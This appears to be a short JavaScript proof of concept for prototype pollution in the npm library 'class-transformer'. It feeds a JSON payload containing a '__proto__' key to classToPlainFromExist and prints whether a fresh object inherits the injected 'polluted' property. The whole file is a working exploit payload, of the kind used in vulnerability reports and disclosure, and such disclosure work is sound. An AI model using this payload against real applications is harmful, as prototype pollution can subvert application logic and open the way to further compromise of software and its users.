var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const root = require('class-transformer');
const payload = JSON.parse('{"__proto__": {"polluted": "yes"}}');
root.classToPlainFromExist(payload, obj);
console.log({}.polluted);